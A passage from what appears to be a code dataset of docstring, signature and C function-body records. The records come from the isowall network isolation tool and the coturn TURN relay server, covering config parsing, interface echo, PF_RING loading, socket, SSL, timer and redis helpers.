EQUALS(\"blockfile\", name)\n                || EQUALS(\"denyfile\", name) || EQUALS(\"dropfile\", name)) {\n        unsigned count1 = isowall->block.count;\n        unsigned count2;\n        ranges_from_file(&isowall->block, value);\n        count2 = isowall->block.count;\n        if (count2 - count1)\n            LOG(1, \"%s: adding %u BLOCK ranges from file\\n\", \n                    value, count2 - count1);\n    } else if (EQUALS(\"includefile\", name) || EQUALS(\"allowfile\", name)\n                || EQUALS(\"acceptfile\", name) || EQUALS(\"passfile\", name)) {\n        unsigned count1 = isowall->block.count;\n        unsigned count2;\n        ranges_from_file(&isowall->block, value);\n        count2 = isowall->block.count;\n        if (count2 - count1)\n            LOG(1, \"%s: adding %u ALLOW ranges from file\\n\", \n                    value, count2 - count1);\n    } else if (EQUALS(\"iflist\", name) || EQUALS(\"listif\", name)) {\n        isowall->op = Operation_List_Adapters;\n        return 0;\n    } else if (EQUALS(\"packet-trace\", name) || EQUALS(\"trace-packet\", name)) {\n        isowall->is_packet_trace = 1;\n        return 0;\n    } else if (EQUALS(\"pfring\", name)) {\n        isowall->is_pfring = 1;\n        return 0;\n    } else if (EQUALS(\"reuse\", name) || EQUALS(\"reuse-external\", name)) {\n        isowall->is_reuse_external = 1;\n        return 0;\n    } else if (EQUALS(\"reuse-external\", name)) {\n        isowall->is_reuse_internal = 1;\n        return 0;\n    } else if (EQUALS(\"sendq\", name)) {\n        isowall->is_sendq = 1;\n        return 0;\n    } else if (EQUALS(\"selftest\", name) || EQUALS(\"self-test\", name) || EQUALS(\"regress\", name)) {\n        isowall->op = Operation_Selftest;\n        return 0;\n    } else if (EQUALS(\"ttl\", name)) {\n        unsigned x = strtoul(value, 0, 0);\n        if (x >= 256) {\n            fprintf(stderr, \"error: %s=<n>: expected number less than 256\\n\", name);\n        } else {\n            isowall->ttl = x;\n        }\n    } else {\n        fprintf(stderr, \"FAIL: unknown config option: %s=%s\\n\", name, value);\n        my_exit(1);\n    }\n    return 1;\n}", "path": "src\\isowall-conf.c", "repo_name": "robertdavidgraham/isowall", "stars": 298, "license": "other", "language": "c", "size": 259}
{"docstring": "/****************************************************************************\n * Echoes the configuration for each network interface\n ****************************************************************************/\n", "func_signal": "static void\necho_nics(const struct IsoWall *isowall, FILE *fp)", "code": "{\n    const struct Adapter *adapter;\n    \n    adapter = &isowall->in;\n\n    fprintf(fp, \"internal.ifname = %s\\n\", adapter->ifname?adapter->ifname:\"\");\n    if (adapter->target_ip != 0)\n    fprintf(fp, \"internal.target.ip = %u.%u.%u.%u\\n\",\n            (adapter->target_ip>>24)&0xFF,\n            (adapter->target_ip>>16)&0xFF,\n            (adapter->target_ip>> 8)&0xFF,\n            (adapter->target_ip>> 0)&0xFF\n            );\n    if (memcmp(adapter->target_mac, \"\\0\\0\\0\\0\\0\\0\", 6) != 0)\n    fprintf(fp, \"internal.target.mac = %02x:%02x:%02x:%02x:%02x:%02x\\n\",\n            adapter->target_mac[0],\n            adapter->target_mac[1],\n            adapter->target_mac[2],\n            adapter->target_mac[3],\n            adapter->target_mac[4],\n            adapter->target_mac[5]);\n    if (memcmp(adapter->my_mac, \"\\0\\0\\0\\0\\0\\0\", 6) != 0)\n    fprintf(fp, \"internal.my.mac = %02x:%02x:%02x:%02x:%02x:%02x\\n\",\n            adapter->my_mac[0],\n            adapter->my_mac[1],\n            adapter->my_mac[2],\n            adapter->my_mac[3],\n            adapter->my_mac[4],\n            adapter->my_mac[5]);\n\n\n    adapter = &isowall->ex;\n\n    fprintf(fp, \"external.ifname = %s\\n\", adapter->ifname?adapter->ifname:\"\");\n    if (adapter->target_ip != 0)\n    fprintf(fp, \"external.router.ip = %u.%u.%u.%u\\n\",\n            (adapter->target_ip>>24)&0xFF,\n            (adapter->target_ip>>16)&0xFF,\n            (adapter->target_ip>> 8)&0xFF,\n            (adapter->target_ip>> 0)&0xFF\n            );\n    if (memcmp(adapter->target_mac, \"\\0\\0\\0\\0\\0\\0\", 6) != 0)\n    fprintf(fp, \"external.router.mac = %02x:%02x:%02x:%02x:%02x:%02x\\n\",\n            adapter->target_mac[0],\n            adapter->target_mac[1],\n            adapter->target_mac[2],\n            adapter->target_mac[3],\n            adapter->target_mac[4],\n            adapter->target_mac[5]);\n    if (memcmp(adapter->my_mac, \"\\0\\0\\0\\0\\0\\0\", 6) != 0)\n    fprintf(fp, \"external.my.mac = %02x:%02x:%02x:%02x:%02x:%02x\\n\",\n            adapter->my_mac[0],\n            adapter->my_mac[1],\n            adapter->my_mac[2],\n            adapter->my_mac[3],\n            adapter->my_mac[4],\n            adapter->my_mac[5]);\n\n\n}", "path": "src\\isowall-conf.c", "repo_name": "robertdavidgraham/isowall", "stars": 298, "license": "other", "language": "c", "size": 259}
{"docstring": "/***************************************************************************\n ***************************************************************************/\n", "func_signal": "int\nPFRING_init(void)", "code": "{\n#if defined(__linux__)\n    void *h;\n    int err = 0;\n    LOG(6, \"pfring: initializing subsystem\\n\");\n    LOG(6, \"pfring: looking for 'libpfring.so'\\n\");\n    h = dlopen(\"libpfring.so\", RTLD_LAZY);\n    if (h == NULL) {\n        LOG(2, \"pfring: error: dlopen('libpfring.so'): %s\\n\", strerror_x(errno));\n        return 0;\n    } else\n        LOG(2, \"pfring: found 'libpfring.so'!\\n\");\n\n#define LOADSYM(name) if ((PFRING.name = dlsym(h, \"pfring_\"#name)) == 0) {LOG(2, \"pfring_%s: not found in 'libpfring.so': %s\\n\", #name, strerror_x(errno));err=1;}\n    LOADSYM(open);\n    LOADSYM(close);\n    LOADSYM(enable_ring);\n    LOADSYM(send);\n    LOADSYM(recv);\n    LOADSYM(poll);\n    LOADSYM(version);\n    LOADSYM(set_direction);\n    LOADSYM(set_application_name);\n    //LOADSYM(get_bound_device);\n\n    if (err) {\n        memset(&PFRING, 0, sizeof(PFRING));\n        LOG(2, \"pfring: failed to load\\n\");\n    } else {\n        LOG(2, \"pfring: successfully loaded PF_RING API\\n\");\n\n        if (!PFRING_is_installed()) {\n            LOG(0, \"pfring: ERROR: 'pf_ring' driver module not found!!!!!\\n\");\n        } else\n            LOG(2, \"pfring: found 'pf_ring' driver module\\n\");\n    }\n\n#endif\n    return 0;\n}", "path": "src\\rawsock-pfring.c", "repo_name": "robertdavidgraham/isowall", "stars": 298, "license": "other", "language": "c", "size": 259}
{"docstring": "//////////////////////// SS ////////////////////////////////////////\n", "func_signal": "static app_ur_session* init_app_session(app_ur_session *ss)", "code": "{\n  if(ss) {\n    ns_bzero(ss,sizeof(app_ur_session));\n    ss->pinfo.fd=-1;\n    ss->pinfo.shatype = shatype;\n  }\n  return ss;\n}", "path": "src\\apps\\uclient\\uclient.c", "repo_name": "coturn/rfc5766-turn-server", "stars": 503, "license": "other", "language": "c", "size": 3077}
{"docstring": "/////////////// SSL ///////////////////\n", "func_signal": "const char* get_ioa_socket_tls_cipher(ioa_socket_handle s)", "code": "{\n\tif(s && (s->ssl))\n\t\treturn SSL_get_cipher(s->ssl);\n\treturn \"\";\n}", "path": "src\\apps\\relay\\ns_ioalib_engine_impl.c", "repo_name": "coturn/rfc5766-turn-server", "stars": 503, "license": "other", "language": "c", "size": 3077}
{"docstring": "/* RFC 6062 ==>> */\n", "func_signal": "static void tcp_listener_input_handler(struct evconnlistener *l, evutil_socket_t fd,\n\t\t\t\tstruct sockaddr *sa, int socklen, void *arg)", "code": "{\n\tUNUSED_ARG(l);\n\n\tioa_socket_handle list_s = (ioa_socket_handle) arg;\n\n\tioa_addr client_addr;\n\tns_bcopy(sa,&client_addr,socklen);\n\n\taddr_debug_print(((list_s->e) && list_s->e->verbose), &client_addr,\"tcp accepted from\");\n\n\tioa_socket_handle s =\n\t\t\t\tcreate_ioa_socket_from_fd(\n\t\t\t\t\t\t\tlist_s->e,\n\t\t\t\t\t\t\tfd,\n\t\t\t\t\t\t\tNULL,\n\t\t\t\t\t\t\tTCP_SOCKET,\n\t\t\t\t\t\t\tTCP_RELAY_DATA_SOCKET,\n\t\t\t\t\t\t\t&client_addr,\n\t\t\t\t\t\t\t&(list_s->local_addr));\n\n\tif (s) {\n\t\tif(list_s->acb) {\n\t\t\tlist_s->acb(s,list_s->acbarg);\n\t\t} else {\n\t\t\tTURN_LOG_FUNC(TURN_LOG_LEVEL_ERROR,\n\t\t\t\t\t\"Do not know what to do with accepted TCP socket\\n\");\n\t\t\tclose_ioa_socket(s);\n\t\t}\n\t} else {\n\t\tTURN_LOG_FUNC(TURN_LOG_LEVEL_ERROR,\n\t\t\t\t\"Cannot create ioa_socket from FD\\n\");\n\t\tsocket_closesocket(fd);\n\t}\n}", "path": "src\\apps\\relay\\ns_ioalib_engine_impl.c", "repo_name": "coturn/rfc5766-turn-server", "stars": 503, "license": "other", "language": "c", "size": 3077}
{"docstring": "/*\n * Network buffer functions\n */\n", "func_signal": "ioa_network_buffer_handle ioa_network_buffer_allocate(ioa_engine_handle e)", "code": "{\n\tstun_buffer_list_elem *buf_elem = new_blist_elem(e);\n\tbuf_elem->buf.len = 0;\n\tbuf_elem->buf.offset = 0;\n\tbuf_elem->buf.coffset = 0;\n\treturn buf_elem;\n}", "path": "src\\apps\\relay\\ns_ioalib_engine_impl.c", "repo_name": "coturn/rfc5766-turn-server", "stars": 503, "license": "other", "language": "c", "size": 3077}
{"docstring": "/* Socket options helpers ==>> */\n", "func_signal": "static int set_socket_ttl(ioa_socket_handle s, int ttl)", "code": "{\n\tif(s->default_ttl < 0) //Unsupported\n\t\treturn -1;\n\n\tif(ttl < 0)\n\t\tttl = s->default_ttl;\n\n\tCORRECT_RAW_TTL(ttl);\n\n\tif(ttl > s->default_ttl)\n\t\tttl=s->default_ttl;\n\n\tif(s->current_ttl != ttl) {\n\t\tint ret = set_raw_socket_ttl(s->fd, s->family, ttl);\n\t\ts->current_ttl = ttl;\n\t\treturn ret;\n\t}\n\n\treturn 0;\n}", "path": "src\\apps\\relay\\ns_ioalib_engine_impl.c", "repo_name": "coturn/rfc5766-turn-server", "stars": 503, "license": "other", "language": "c", "size": 3077}
{"docstring": "/******************** Timers ****************************/\n", "func_signal": "static void timer_event_handler(evutil_socket_t fd, short what, void* arg)", "code": "{\n  timer_event* te = (timer_event*)arg;\n\n\tif(!te)\n\t\treturn;\n\n\tUNUSED_ARG(fd);\n\n\tif (!(what & EV_TIMEOUT))\n\t\treturn;\n\n\tif(te->e && eve(te->e->verbose))\n\t\tTURN_LOG_FUNC(TURN_LOG_LEVEL_INFO, \"%s: timeout 0x%lx: %s\\n\", __FUNCTION__,(long)te, te->txt);\n\n\tioa_timer_event_handler cb = te->cb;\n\tioa_engine_handle e = te->e;\n\tvoid *ctx = te->ctx;\n\n\tcb(e, ctx);\n}", "path": "src\\apps\\relay\\ns_ioalib_engine_impl.c", "repo_name": "coturn/rfc5766-turn-server", "stars": 503, "license": "other", "language": "c", "size": 3077}
{"docstring": "/************** SOCKETS HELPERS ***********************/\n", "func_signal": "int ioa_socket_check_bandwidth(ioa_socket_handle s, ioa_network_buffer_handle nbh, int read)", "code": "{\n\tif(s && (s->e) && nbh && (s->e->max_bpj != 0) &&\n\t\t\t((s->sat == CLIENT_SOCKET) || (s->sat == RELAY_SOCKET) || (s->sat == RELAY_RTCP_SOCKET)) &&\n\t\t\ts->session) {\n\n\t\tsize_t sz = ioa_network_buffer_get_size(nbh);\n\n\t\tband_limit_t max_bps = s->e->max_bpj;\n\n\t\tif(max_bps<1)\n\t\t\treturn 1;\n\n\t\tstruct traffic_bytes *traffic = &(s->data_traffic);\n\n\t\tif(s->sat == CLIENT_SOCKET) {\n\t\t\tu08bits *buf = ioa_network_buffer_data(nbh);\n\t\t\tif(stun_is_command_message_str(buf,sz)) {\n\t\t\t\tu16bits method = stun_get_method_str(buf,sz);\n\t\t\t\tif((method != STUN_METHOD_SEND) && (method != STUN_METHOD_DATA)) {\n\t\t\t\t\ttraffic = &(s->control_traffic);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tband_limit_t bsz = (band_limit_t)sz;\n\n\t\tif(s->jiffie != s->e->jiffie) {\n\n\t\t\ts->jiffie = s->e->jiffie;\n\t\t\ttraffic->jiffie_bytes_read = 0;\n\t\t\ttraffic->jiffie_bytes_write = 0;\n\n\t\t\tif(bsz > max_bps) {\n\t\t\t\treturn 0;\n\t\t\t} else {\n\t\t\t\tif(read)\n\t\t\t\t\ttraffic->jiffie_bytes_read = bsz;\n\t\t\t\telse\n\t\t\t\t\ttraffic->jiffie_bytes_write = bsz;\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t} else {\n\t\t\tband_limit_t nsz;\n\t\t\tif(read)\n\t\t\t\tnsz = traffic->jiffie_bytes_read + bsz;\n\t\t\telse\n\t\t\t\tnsz = traffic->jiffie_bytes_write + bsz;\n\t\t\tif(nsz > max_bps) {\n\t\t\t\treturn 0;\n\t\t\t} else {\n\t\t\t\tif(read)\n\t\t\t\t\ttraffic->jiffie_bytes_read = nsz;\n\t\t\t\telse\n\t\t\t\t\ttraffic->jiffie_bytes_write = nsz;\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t}\n\t}\n\n\treturn 1;\n}", "path": "src\\apps\\relay\\ns_ioalib_engine_impl.c", "repo_name": "coturn/rfc5766-turn-server", "stars": 503, "license": "other", "language": "c", "size": 3077}
{"docstring": "///////////////////////// Send-receive ///////////////////////////\n", "func_signal": "static void send_message_for_redis(redisAsyncContext *ac, const struct redis_message *rm)", "code": "{\n\n\tif(!ac)\n\t\treturn;\n\n\tstruct redisLibeventEvents *e = (struct redisLibeventEvents *)(ac->ev.data);\n\n\tif(e && rm) {\n\t\tstruct evbuffer *output = bufferevent_get_output(e->out_buf);\n\t\tif(evbuffer_add(output,rm,sizeof(*rm))<0) {\n\t\t\tfprintf(stderr,\"%s: Weird buffer error\\n\",__FUNCTION__);\n\t\t}\n\t}\n}", "path": "src\\apps\\common\\hiredis_libevent2.c", "repo_name": "coturn/rfc5766-turn-server", "stars": 503, "license": "other", "language": "c", "size": 3077}
{"docstring": "/* <<== Socket options helpers */\n", "func_signal": "ioa_socket_handle create_unbound_ioa_socket(ioa_engine_handle e, int family, SOCKET_TYPE st, SOCKET_APP_TYPE sat)", "code": "{\n\tevutil_socket_t fd = -1;\n\tioa_socket_handle ret = NULL;\n\n\tswitch (st){\n\tcase UDP_SOCKET:\n\t\tfd = socket(family, SOCK_DGRAM, 0);\n\t\tif (fd < 0) {\n\t\t\tperror(\"UDP socket\");\n\t\t\treturn NULL;\n\t\t}\n\t\tset_sock_buf_size(fd, UR_CLIENT_SOCK_BUF_SIZE);\n\t\tbreak;\n\tcase TCP_SOCKET:\n\t\tfd = socket(family, SOCK_STREAM, 0);\n\t\tif (fd < 0) {\n\t\t\tperror(\"TCP socket\");\n\t\t\treturn NULL;\n\t\t}\n\t\tset_sock_buf_size(fd, UR_CLIENT_SOCK_BUF_SIZE);\n\t\tbreak;\n\tdefault:\n\t\t/* we do not support other sockets in the relay position */\n\t\treturn NULL;\n\t}\n\n\tret = (ioa_socket*)turn_malloc(sizeof(ioa_socket));\n\tns_bzero(ret,sizeof(ioa_socket));\n\n\tret->magic = SOCKET_MAGIC;\n\n\tret->fd = fd;\n\tret->family = family;\n\tret->st = st;\n\tret->sat = sat;\n\tret->e = e;\n\n\tset_socket_options(ret);\n\n\treturn ret;\n}", "path": "src\\apps\\relay\\ns_ioalib_engine_impl.c", "repo_name": "coturn/rfc5766-turn-server", "stars": 503, "license": "other", "language": "c", "size": 3077}
{"docstring": "/************** ENGINE *************************/\n", "func_signal": "static void timer_handler(ioa_engine_handle e, void* arg)", "code": "{\n\n  UNUSED_ARG(arg);\n\n  _log_time_value = turn_time();\n  _log_time_value_set = 1;\n\n  e->jiffie = _log_time_value;\n}", "path": "src\\apps\\relay\\ns_ioalib_engine_impl.c", "repo_name": "coturn/rfc5766-turn-server", "stars": 503, "license": "other", "language": "c", "size": 3077}
{"docstring": "/*\n * Return: -1 - error, 0 or >0 - OK\n * *read_len -1 - no data, >=0 - data available\n */\n", "func_signal": "int ssl_read(evutil_socket_t fd, SSL* ssl, ioa_network_buffer_handle nbh, int verbose)", "code": "{\n\tint ret = 0;\n\n\tif (!ssl || !nbh)\n\t\treturn -1;\n\n\ts08bits* buffer = (s08bits*)ioa_network_buffer_data(nbh);\n\tint buf_size = (int)ioa_network_buffer_get_capacity_udp();\n\tint read_len = (int)ioa_network_buffer_get_size(nbh);\n\n\tif(read_len < 1)\n\t\treturn -1;\n\n\ts08bits *new_buffer = buffer + buf_size;\n\tint old_buffer_len = read_len;\n\n\tint len = 0;\n\n\tif (eve(verbose)) {\n\t\tTURN_LOG_FUNC(TURN_LOG_LEVEL_INFO, \"%s: before read...\\n\", __FUNCTION__);\n\t}\n\n\tBIO *wbio = SSL_get_wbio(ssl);\n\tif(wbio) {\n\t\tBIO_set_fd(wbio,fd,BIO_NOCLOSE);\n\t}\n\n\tBIO* rbio = BIO_new_mem_buf(buffer, old_buffer_len);\n\tBIO_set_mem_eof_return(rbio, -1);\n\n\tssl->rbio = rbio;\n\n\tint if1 = SSL_is_init_finished(ssl);\n\n\tdo {\n\t\tlen = SSL_read(ssl, new_buffer, buf_size);\n\t} while (len < 0 && (errno == EINTR));\n\n\tint if2 = SSL_is_init_finished(ssl);\n\n\tif (eve(verbose)) {\n\t\tTURN_LOG_FUNC(TURN_LOG_LEVEL_INFO, \"%s: after read: %d\\n\", __FUNCTION__, len);\n\t}\n\n\tif(SSL_get_shutdown(ssl)) {\n\n\t\tret = -1;\n\n\t} else if (!if1 && if2) {\n\n\t\tif(verbose && SSL_get_peer_certificate(ssl)) {\n\t\t  printf(\"\\n------------------------------------------------------------\\n\");\n\t\t  X509_NAME_print_ex_fp(stdout, X509_get_subject_name(SSL_get_peer_certificate(ssl)), 1,\n\t\t\t\t\tXN_FLAG_MULTILINE);\n\t\t  printf(\"\\n\\n Cipher: %s\\n\", SSL_CIPHER_get_name(SSL_get_current_cipher(ssl)));\n\t\t  printf(\"\\n------------------------------------------------------------\\n\\n\");\n\t\t}\n\n\t\tret = 0;\n\n\t} else if (len < 0 && ((errno == ENOBUFS) || (errno == EAGAIN))) {\n\t\tif (eve(verbose)) {\n\t\t\tTURN_LOG_FUNC(TURN_LOG_LEVEL_INFO, \"%s: ENOBUFS/EAGAIN\\n\", __FUNCTION__);\n\t\t}\n\t\tret = 0;\n\t} else {\n\n\t\tif (eve(verbose)) {\n\t\t\tTURN_LOG_FUNC(TURN_LOG_LEVEL_INFO, \"%s: read %d bytes\\n\", __FUNCTION__, (int) len);\n\t\t}\n\n\t\tif (len >= 0) {\n\t\t\tret = len;\n\t\t} else {\n\t\t\tswitch (SSL_get_error(ssl, len)){\n\t\t\tcase SSL_ERROR_NONE:\n\t\t\t\t//???\n\t\t\t\tret = 0;\n\t\t\t\tbreak;\n\t\t\tcase SSL_ERROR_WANT_READ:\n\t\t\t\tret = 0;\n\t\t\t\tbreak;\n\t\t\tcase SSL_ERROR_WANT_WRITE:\n\t\t\t\tret = 0;\n\t\t\t\tbreak;\n\t\t\tcase SSL_ERROR_ZERO_RETURN:\n\t\t\t\tret = 0;\n\t\t\t\tbreak;\n\t\t\tcase SSL_ERROR_SYSCALL:\n\t\t\t{\n\t\t\t\tint err = errno;\n\t\t\t\tif (handle_socket_error()) {\n\t\t\t\t\tret = 0;\n\t\t\t\t} else {\n\t\t\t\t\tTURN_LOG_FUNC(TURN_LOG_LEVEL_INFO, \"TLS Socket read error: %d\\n\", err);\n\t\t\t\t\tret = -1;\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase SSL_ERROR_SSL:\n\t\t\t\tif (verbose) {\n\t\t\t\t\tTURN_LOG_FUNC(TURN_LOG_LEVEL_INFO, \"SSL read error: \");\n\t\t\t\t\ts08bits buf[65536];\n\t\t\t\t\tTURN_LOG_FUNC(TURN_LOG_LEVEL_INFO, \"%s (%d)\\n\", ERR_error_string(ERR_get_error(), buf), SSL_get_error(ssl, len));\n\t\t\t\t}\n\t\t\t\tif (verbose)\n\t\t\t\t\tTURN_LOG_FUNC(TURN_LOG_LEVEL_INFO, \"SSL connection closed.\\n\");\n\t\t\t\tret = -1;\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tif (verbose) {\n\t\t\t\t\tTURN_LOG_FUNC(TURN_LOG_LEVEL_INFO, \"Unexpected error while reading!\\n\");\n\t\t\t\t}\n\t\t\t\tret = -1;\n\t\t\t}\n\t\t}\n\t}\n\n\tif(ret>0) {\n\t\tioa_network_buffer_add_offset_size(nbh, (u16bits)buf_size, 0, (size_t)ret);\n\t}\n\n\tBIO_free(rbio);\n\tssl->rbio = NULL;\n\n\treturn ret;\n}", "path": "src\\apps\\relay\\ns_ioalib_engine_impl.c", "repo_name": "coturn/rfc5766-turn-server", "stars": 503, "license": "other", "language": "c", "size": 3077}
{"docstring": "////////////////////// main method /////////////////\n", "func_signal": "static int start_client(const char *remote_address, int port,\n\t\t\tconst unsigned char* ifname, const char *local_address, \n\t\t\tint messagenumber, \n\t\t\tint i)", "code": "{\n\n  app_ur_session* ss=create_new_ss();\n  app_ur_session* ss_rtcp=NULL;\n\n  if(!no_rtcp)\n    ss_rtcp = create_new_ss();\n\n  app_ur_conn_info clnet_info_probe; /* for load balancing probe */\n  ns_bzero(&clnet_info_probe,sizeof(clnet_info_probe));\n  clnet_info_probe.fd = -1;\n  clnet_info_probe.shatype = shatype;\n\n  app_ur_conn_info *clnet_info=&(ss->pinfo);\n  app_ur_conn_info *clnet_info_rtcp=NULL;\n\n  if(!no_rtcp) \n    clnet_info_rtcp = &(ss_rtcp->pinfo);\n\n  uint16_t chnum=0;\n  uint16_t chnum_rtcp=0;\n\n  start_connection(port, remote_address, \n\t\t   ifname, local_address, \n\t\t   clnet_verbose,\n\t\t   &clnet_info_probe,\n\t\t   clnet_info, &chnum,\n\t\t   clnet_info_rtcp, &chnum_rtcp);\n\t\t   \n  if(clnet_info_probe.ssl) {\n  \tSSL_free(clnet_info_probe.ssl);\n  \tclnet_info_probe.ssl = NULL;\n  \tclnet_info_probe.fd = -1;\n  } else if(clnet_info_probe.fd != -1) {\n\t  socket_closesocket(clnet_info_probe.fd);\n\t  clnet_info_probe.fd = -1;\n  }\n  \n  socket_set_nonblocking(clnet_info->fd);\n  \n  if(!no_rtcp) \n\t  socket_set_nonblocking(clnet_info_rtcp->fd);\n  \n  struct event* ev = event_new(client_event_base,clnet_info->fd,\n\t\t\t\tEV_READ|EV_PERSIST,client_input_handler,\n\t\t\t\tss);\n\n  event_add(ev,NULL);\n  \n  struct event* ev_rtcp = NULL;\n\n  if(!no_rtcp) {\n    ev_rtcp = event_new(client_event_base,clnet_info_rtcp->fd,\n\t\t\tEV_READ|EV_PERSIST,client_input_handler,\n\t\t\tss_rtcp);\n  \n    event_add(ev_rtcp,NULL);\n  }\n  \n  ss->state=UR_STATE_READY;\n  \n  ss->input_ev=ev;\n  ss->tot_msgnum=messagenumber;\n  ss->recvmsgnum=-1;\n  ss->chnum=chnum;\n\n  if(!no_rtcp) {\n\n    ss_rtcp->state=UR_STATE_READY;\n    \n    ss_rtcp->input_ev=ev_rtcp;\n    ss_rtcp->tot_msgnum=ss->tot_msgnum;\n    if(ss_rtcp->tot_msgnum<1) ss_rtcp->tot_msgnum=1;\n    ss_rtcp->recvmsgnum=-1;\n    ss_rtcp->chnum=chnum_rtcp;\n  }\n  \n  elems[i]=ss;\n\n  refresh_channel(ss, 0, 600);\n\n  if(!no_rtcp)\n    elems[i+1]=ss_rtcp;\n\n  return 0;\n}", "path": "src\\apps\\uclient\\uclient.c", "repo_name": "coturn/rfc5766-turn-server", "stars": 503, "license": "other", "language": "c", "size": 3077}
{"docstring": "/************** Buffer List ********************/\n", "func_signal": "static int buffer_list_empty(stun_buffer_list *bufs)", "code": "{\n\tif(bufs && bufs->head && bufs->tsz)\n\t\treturn 0;\n\treturn 1;\n}", "path": "src\\apps\\relay\\ns_ioalib_engine_impl.c", "repo_name": "coturn/rfc5766-turn-server", "stars": 503, "license": "other", "language": "c", "size": 3077}
{"docstring": "///////////////////////// Attach /////////////////////////////////\n", "func_signal": "redis_context_handle redisLibeventAttach(struct event_base *base, char *ip0, int port0, char *pwd, int db)", "code": "{\n\n  struct redisLibeventEvents *e = NULL;\n  redisAsyncContext *ac = NULL;\n\n  char ip[256];\n  if(ip0 && ip0[0])\n\t  STRCPY(ip,ip0);\n  else\n\t  STRCPY(ip,\"127.0.0.1\");\n\n  int port = DEFAULT_REDIS_PORT;\n  if(port0>0)\n\t  port=port0;\n  \n  ac = redisAsyncConnect(ip, port);\n  if (ac->err) {\n  \tfprintf(stderr,\"Error: %s\\n\", ac->errstr);\n  \treturn NULL;\n  }\n\n  /* Create container for context and r/w events */\n  e = (struct redisLibeventEvents*)turn_malloc(sizeof(struct redisLibeventEvents));\n  ns_bzero(e,sizeof(struct redisLibeventEvents));\n\n  e->allocated = 1;\n  e->context = ac;\n  e->base = base;\n\n  /* Register functions to start/stop listening for events */\n  ac->ev.addRead = redisLibeventAddRead;\n  ac->ev.delRead = redisLibeventDelRead;\n  ac->ev.addWrite = redisLibeventAddWrite;\n  ac->ev.delWrite = redisLibeventDelWrite;\n  ac->ev.cleanup = redisLibeventCleanup;\n\n  ac->ev.data = e;\n\n  /* Initialize and install read/write events */\n  e->rev = event_new(e->base,e->context->c.fd,\n  \t\t     EV_READ|EV_PERSIST,redisLibeventReadEvent,\n  \t\t     e);\n\n  e->wev = event_new(e->base,e->context->c.fd,\n\t\t     EV_WRITE,redisLibeventWriteEvent,\n  \t\t     e);\n\n  if (e->rev == NULL || e->wev == NULL) {\n\t  turn_free(e, sizeof(struct redisLibeventEvents));\n\t  return NULL;\n  }\n  \n  event_add(e->wev, NULL);\n  e->wev_set = 1;\n\n  struct bufferevent *pair[2];\n\n  bufferevent_pair_new(base, TURN_BUFFEREVENTS_OPTIONS, pair);\n  e->in_buf = pair[0];\n  e->out_buf = pair[1];\n  bufferevent_setcb(e->in_buf, receive_message_for_redis, NULL, NULL, e);\n  bufferevent_enable(e->in_buf, EV_READ);\n\n  //Authentication\n  if(pwd)\n\t  redisAsyncCommand(ac, NULL, e, \"AUTH %s\", pwd);\n\n  if(db>0)\n\t  redisAsyncCommand(ac, NULL, e, \"SELECT %d\", db);\n\n  return ac;\n}", "path": "src\\apps\\common\\hiredis_libevent2.c", "repo_name": "coturn/rfc5766-turn-server", "stars": 503, "license": "other", "language": "c", "size": 3077}
{"docstring": "///////////////////////////////////////////\n", "func_signal": "turn_credential_type get_turn_credentials_type(void)", "code": "{\n\tif(use_short_term)\n\t\treturn TURN_CREDENTIALS_SHORT_TERM;\n\treturn TURN_CREDENTIALS_LONG_TERM;\n}", "path": "src\\apps\\uclient\\uclient.c", "repo_name": "coturn/rfc5766-turn-server", "stars": 503, "license": "other", "language": "c", "size": 3077}
{"docstring": "/////////////////// Callbacks ////////////////////////////\n", "func_signal": "static void redisLibeventReadEvent(int fd, short event, void *arg)", "code": "{\n  ((void)fd); ((void)event);\n  struct redisLibeventEvents *e = (struct redisLibeventEvents*)arg;\n  if(e) {\n    redisAsyncHandleRead(e->context);\n  }\n}", "path": "src\\apps\\common\\hiredis_libevent2.c", "repo_name": "coturn/rfc5766-turn-server", "stars": 503, "license": "other", "language": "c", "size": 3077}
{"docstring": "///////////////////////////////////////////////////////////////////////////////\n", "func_signal": "int send_buffer(app_ur_conn_info *clnet_info, stun_buffer* message, int data_connection, app_tcp_conn_info *atc)", "code": "{\n\n\tint rc = 0;\n\tint ret = -1;\n\n\tchar *buffer = (char*) (message->buf);\n\n\tif(negative_protocol_test && (message->len>0)) {\n\t\tif(random()%10 == 0) {\n\t\t\tint np = (int)((unsigned long)random()%10);\n\t\t\twhile(np-->0) {\n\t\t\t\tint pos = (int)((unsigned long)random()%(unsigned long)message->len);\n\t\t\t\tint val = (int)((unsigned long)random()%256);\n\t\t\t\tmessage->buf[pos]=(u08bits)val;\n\t\t\t}\n\t\t}\n\t}\n\n\tSSL *ssl = clnet_info->ssl;\n\tioa_socket_raw fd = clnet_info->fd;\n\n\tif(data_connection) {\n\t  if(atc) {\n\t    ssl = atc->tcp_data_ssl;\n\t    fd = atc->tcp_data_fd;\n\t  } else if(is_TCP_relay()){\n\t    TURN_LOG_FUNC(TURN_LOG_LEVEL_ERROR,\n\t\t\t  \"trying to send tcp data buffer over unready connection: size=%d\\n\",(int)(message->len));\n\t    return -1;\n\t  }\n\t}\n\n\tif (ssl) {\n\n\t\tint message_sent = 0;\n\t\twhile (!message_sent) {\n\n\t\t\tif (SSL_get_shutdown(ssl)) {\n\t\t\t\treturn -1;\n\t\t\t}\n\n\t\t\tint len = 0;\n\t\t\tdo {\n\t\t\t\tlen = SSL_write(ssl, buffer, (int)message->len);\n\t\t\t} while (len < 0 && ((errno == EINTR) || (errno == ENOBUFS)));\n\n\t\t\tif(len == (int)message->len) {\n\t\t\t\tif (clnet_verbose) {\n\t\t\t\t\tTURN_LOG_FUNC(TURN_LOG_LEVEL_INFO,\n\t\t\t\t\t\t\t\"buffer sent: size=%d\\n\",len);\n\t\t\t\t}\n\n\t\t\t\tmessage_sent = 1;\n\t\t\t\tret = len;\n\t\t\t} else {\n\t\t\t\tswitch (SSL_get_error(ssl, len)){\n\t\t\t\tcase SSL_ERROR_NONE:\n\t\t\t\t\t/* Try again ? */\n\t\t\t\t\tbreak;\n\t\t\t\tcase SSL_ERROR_WANT_WRITE:\n\t\t\t\t\t/* Just try again later */\n\t\t\t\t\tbreak;\n\t\t\t\tcase SSL_ERROR_WANT_READ:\n\t\t\t\t\t/* continue with reading */\n\t\t\t\t\tbreak;\n\t\t\t\tcase 